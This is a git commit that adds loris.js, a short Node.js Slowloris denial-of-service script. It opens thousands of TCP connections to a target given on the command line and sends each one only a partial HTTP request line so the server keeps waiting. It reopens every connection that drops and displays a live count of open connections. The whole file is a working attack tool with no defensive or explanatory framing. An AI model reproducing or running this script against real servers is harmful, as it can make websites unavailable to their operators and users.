1347e1a4d08cd3bacc6515209fdca1983ae0647d
Ian <ian10_141@yahoo.com.br>
2017-09-22 16:52:36 -0300

    default port added

---
+++ loris.js
@@ -0,0 +1,43 @@
+const net = require('net');
+const parse = require('url').parse;
+
+//url
+let url = process.argv[2];
+url = parse(url)
+const args = {
+	host: url.hostname,
+	port: url.port || 80
+}
+
+//connections
+let c = process.argv[3] || 9999
+
+//alive connections
+let alive = 0;
+
+const open = ()=>{
+	var client = net.connect(args.port, args.host, ()=> {
+		alive++;
+		//send just a part of the header, so the server keeps waiting for the rest of the request
+		client.write('GET / HTTP/1.1\r\n');
+	});	
+	
+	client.on('close', function() {
+		//open a new connection every time a connection dies;
+		alive --;
+		open();
+	});
+}
+
+const console = ()=>{
+  const P = ["\\", "|", "/", "-"];
+  let x = 0;
+  return setInterval(()=>{
+    process.stdout.write("\r" + P[x++] + " Active connections: " + alive);
+    if(x==4)x = 0;
+  }, 100);
+}
+
+//starting
+console();
+while(c--){open()}
